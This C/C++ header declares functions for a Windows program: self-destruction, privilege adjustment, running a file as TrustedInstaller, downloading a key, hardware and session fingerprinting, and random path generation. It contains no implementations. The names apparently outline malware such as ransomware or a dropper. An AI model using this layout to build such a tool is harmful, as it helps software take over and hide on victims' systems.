#pragma once
#include "shared.h"
#include "resource.h"
#include <shellapi.h>

/* WinMain : main.c */
VOID ESelfDestruct();

/* NT Functions : NT.c */
BOOL EAdjustPrivilege(_In_ PCWSTR lpszPrivilege, _In_ BOOL bEnablePrivilege);

/* Random : Random.c */
namespace rng {
	VOID EGenRandomB64W(_In_opt_ PDWORD dwState, _Out_ void* sz, _In_ size_t n);
	VOID EGenRandomPathW(_In_opt_ PDWORD dwState, _Out_ void* sz, _In_ size_t n);
	PCWSTR EAllocRandomBase64StringW(_In_opt_ PDWORD dwState, _In_ size_t nMin, _In_opt_ size_t nMax);
	PCWSTR EAllocRandomPathW(_In_opt_ PDWORD dwState, _In_ size_t nMin, _In_opt_ size_t nMax);
	VOID EGenRandom(_In_opt_ PDWORD dwState, _Out_ void* pBuffer, _In_ size_t nBuffer);
}

/* Utils and Other : Utils.c*/
namespace utl {
	BOOL IIsUserAdmin();
	PVOID ELoadResourceW(_In_ WORD wResID, _In_ PCWSTR pResType, _Out_ size_t* nBufferSize);
	PVOID IDownloadKey();
	VOID IGenerateHardwareId(_Out_ cry::Md5::hash* pHwId);
	VOID IGenerateSessionId(_Out_ cry::Md5::hash* pSId);
	BOOL ERunAsTrustedInstaller(_In_ PCWSTR szFileName, _In_ PCWSTR szCmdLine, _In_opt_ PCWSTR szDirectory);

	PVOID AllocReadFileW(_In_ PCWSTR szFileName, _Out_ size_t* nFileSize);
	BOOL WriteFileCW(_In_ PCWSTR pFileName, _In_ void* pBuffer, _In_ size_t nBuffer);
	PCWSTR GetFileNameFromPathW(_In_ PCWSTR pPath);
}